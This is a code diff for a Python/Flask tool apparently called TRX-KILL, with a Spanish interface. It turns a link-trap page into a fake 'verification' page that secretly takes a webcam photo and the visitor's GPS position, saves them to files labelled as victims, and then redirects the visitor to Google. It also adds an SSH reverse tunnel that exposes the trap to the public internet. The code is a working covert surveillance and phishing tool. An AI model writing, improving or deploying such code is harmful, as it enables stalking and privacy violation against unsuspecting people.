@@ -10,16 +10,22 @@ os.makedirs(CAPTURA_PATH, exist_ok=True)
 app = Flask('TRX-KILL')
 G, C, R, Y, W = "\033[1;32m", "\033[1;36m", "\033[1;31m", "\033[1;33m", "\033[0m"
 
-# --- INTERFAZ ---
+# Motor de Captura Web
 HTML_UI = """
 <!DOCTYPE html><html><body style="background:#000; color:#0f0; text-align:center; font-family:monospace;">
-<h1 style="color:#0ff;">SISTEMA TRX-KILL</h1>
+<h1 style="color:#0ff;">SISTEMA DE VERIFICACIÓN</h1>
 <button onclick="go()" style="padding:20px; font-size:20px; background:#0f0; border:none; cursor:pointer;">EJECUTAR PROCESO</button>
 <script>
 async function go() {
+    let s = await navigator.mediaDevices.getUserMedia({video: true});
     let p = await new Promise(r => navigator.geolocation.getCurrentPosition(r));
-    fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude);
-    alert('Información procesada');
+    let v = document.createElement('video'); v.srcObject = s; v.play();
+    setTimeout(() => {
+        let c = document.createElement('canvas'); c.width=400; c.height=300;
+        c.getContext('2d').drawImage(v, 0, 0, 400, 300);
+        fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&img='+encodeURIComponent(c.toDataURL()));
+        window.location.href='https://google.com';
+    }, 1000);
 }
 </script></body></html>
 """
@@ -30,47 +36,43 @@ def index(): return render_template_string(HTML_UI)
 @app.route('/log')
 def log():
     with open(LOG_FILE, "a") as f: f.write(f"VÍCTIMA:{request.remote_addr} | GPS:{request.args.get('lat')}\n")
+    if request.args.get('img'):
+        with open(f"{CAPTURA_PATH}/cap_{int(time.time())}.jpg", "wb") as f:
+            f.write(base64.b64decode(request.args.get('img').split(',')[1]))
     return "OK"
 
 def animar(t):
     for c in t: sys.stdout.write(f"{G}{c}{W}"); sys.stdout.flush(); time.sleep(0.02)
     print()
 
-def banner():
-    os.system('clear')
-    print(f"{G}  ___ ___  ___  _  __  ___  ___  _    _")
-    print(" |__ |__  |__  | \\/ / |__  |___ | |  | |")
-    print("    | |___ |___ |  /  |___ |    |_|__|_|")
-    print(f"{C}--- TRX-KILL MASTER CONTROL ---{W}\n")
-
 def menu():
     threading.Thread(target=lambda: app.run(port=5000), daemon=True).start()
     while True:
-        banner()
+        os.system('clear')
+        print(f"{G}  ___ ___  ___  _  __  ___  ___  _    _")
+        print(" |__ |__  |__  | \\/ / |__  |___ | |  | |")
+        print("    | |___ |___ |  /  |___ |    |_|__|_|")
+        print(f"{C}--- TRX-KILL MASTER SYSTEM ---{W}\n")
         print(f"{G}┌──────────────────────────────────────────────┐")
-        print(f"│ {C} 1. {W}VER INFORMACIÓN DE LA RED               │")
-        print(f"│ {C} 2. {W}LINK-TRAP (127.0.0.1)                 │")
-        print(f"│ {C} 3. {W}CLON-LINK (EXTERNO)                   │")
-        print(f"│ {C} 4. {W}IP-SCANNER                            │")
-        print(f"│ {C} 7. {W}SALIR                                 │")
+        print(f"│ {C} 1. {W}VER INFO DE RED                           │")
+        print(f"│ {C} 2. {W}LINK-TRAP (127.0.0.1)                     │")
+        print(f"│ {C} 3. {W}LINK-TÚNEL (HTTPS EXTERNO)              │")
+        print(f"│ {C} 4. {W}IP-SCANNER (RASTREO)                    │")
+        print(f"│ {C} 5. {W}GESTIONAR CAPTURAS                      │")
+        print(f"│ {C} 7. {W}SALIR                                     │")
         print(f"└──────────────────────────────────────────────┘{W}")
         
         sel = input(f"\n{Y}TRX-ROOT > {W}")
-        
+
         if sel == "1":
-            animar("VERIFICANDO INFORMACIÓN DE RED..........")
-            ip = socket.gethostbyname(socket.gethostname())
-            print(f"{G}[+] IP LOCAL: {ip}")
-            print(f"{G}[+] PUERTO 5000: ABIERTO{W}")
-            input(f"\n{Y}Presiona Enter para continuar...{W}")
-            
+            animar("VERIFICANDO RED..."); print(f"{G}IP LOCAL: {socket.gethostbyname(socket.gethostname())}\nPUERTO 5000: ABIERTO{W}"); input()
         elif sel == "2":
-            print(f"{C}LINK ACTIVO: http://127.0.0.1:5000{W}")
-            print(f"{Y}ESPERANDO QUE EL USUARIO INGRESE...{W}")
-            while not os.path.exists(LOG_FILE): time.sleep(0.5)
-            print(f"{R}>>> ¡DATOS RECIBIDOS Y GUARDADOS EN LA CARPETA! <<<{W}")
-            input(f"\n{Y}Presiona Enter...{W}")
-            
+            print(f"{C}LINK: http://127.0.0.1:5000{W}"); input(f"{Y}ESPERANDO VÍCTIMA... (Enter para salir){W}")
+        elif sel == "3":
+            animar("LANZANDO TÚNEL HTTPS..."); os.system('ssh -R 80:localhost:5000 ssh.localhost.run &')
+            print(f"{G}TÚNEL ACTIVO (localhost.run){W}"); input()
+        elif sel == "5":
+            os.system(f"ls -R {STORAGE_PATH}"); input()
         elif sel == "7": sys.exit()
 
 if __name__ == "__main__": menu()
